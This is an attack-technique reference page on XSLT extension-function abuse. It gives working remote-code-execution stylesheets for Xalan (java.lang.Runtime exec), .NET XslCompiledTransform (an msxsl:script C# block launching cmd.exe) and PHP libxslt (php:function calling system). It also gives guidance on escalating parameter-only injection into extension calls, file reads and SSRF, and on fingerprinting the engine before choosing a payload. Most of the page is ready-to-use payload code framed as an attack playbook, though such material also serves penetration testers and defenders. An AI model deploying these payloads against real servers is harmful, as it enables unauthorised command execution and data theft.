---
title: "Extension function abuse: code execution in the transform runtime"
description: "Java and .NET extension functions and embedded xsl:script / msxsl:script blocks run host-runtime code when a stylesheet or its parameters are attacker-influenced."
keywords:
  - XSLT extension functions
  - xsl:script
  - msxsl:script
  - Xalan Java binding
  - XSLT RCE
---

# Extension function abuse

Server-side XSLT engines let a stylesheet call out to the host runtime: the JVM through Java class bindings, .NET through CLR types, and both through embedded script blocks. When any of this reaches attacker-influenced stylesheet text, the transform stops being a data projection and becomes code execution in the process running it. The available mechanism is engine-specific, so the payload follows the fingerprint returned by `system-property('xsl:vendor')`.

## Java extension functions (Xalan, Saxon-B)

Xalan maps a namespace prefix to a Java class and lets the stylesheet instantiate it and call methods. A new `java.lang.Runtime` runs an arbitrary command:

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
    xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
  <xsl:template match="/">
    <xsl:variable name="rt" select="rt:getRuntime()"/>
    <xsl:value-of select="rt:exec($rt, 'id')"/>
  </xsl:template>
</xsl:stylesheet>
```

Reading the process output back requires wrapping the returned `Process` stream, commonly via `java.io.InputStreamReader` and `java.util.Scanner` bound the same way, so the command result lands in the transform output.

## Embedded scripts (.NET, MSXML)

The .NET `XslCompiledTransform` compiles `msxsl:script` blocks when scripting is enabled, executing C# or JScript inside the transform:

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:msxsl="urn:schemas-microsoft-com:xslt"
    xmlns:user="urn:user">
  <msxsl:script language="C#" implements-prefix="user">
    public string run() {
      return new System.Diagnostics.Process {
        StartInfo = new System.Diagnostics.ProcessStartInfo("cmd.exe","/c whoami"){
          RedirectStandardOutput = true, UseShellExecute = false }
      }.Start().ToString();
    }
  </msxsl:script>
  <xsl:template match="/"><xsl:value-of select="user:run()"/></xsl:template>
</xsl:stylesheet>
```

PHP's libxslt exposes the parallel `php:function` binding when `registerPHPFunctions()` is permitted, calling any PHP function including `system` or `file_get_contents`:

```xml
<xsl:value-of select="php:function('system','id')"/>
```

## Parameter-only influence

Full code execution needs stylesheet control, but where only a parameter is attacker-supplied the reachable surface is still large: an injected parameter spliced into an `xsl:value-of select` attribute runs attacker-chosen XPath, which reaches every registered extension function the stylesheet already imports. If that stylesheet declares a Java or PHP binding, the parameter alone calls it, and otherwise the parameter drives `document()` and `unparsed-text()` for file read and SSRF. Enumerating the declared namespaces with `system-property()` and probing which prefixes resolve shows which runtime bridge is live before committing to a full payload.

## References

- [Apache Xalan: Extension Functions](https://xml.apache.org/xalan-j/extensions.html)
- [Microsoft: Script Blocks Using msxsl:script](https://learn.microsoft.com/en-us/dotnet/standard/data/xml/script-blocks-using-msxsl-script)
- [PayloadsAllTheThings: XSLT Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSLT%20Injection/README.md)
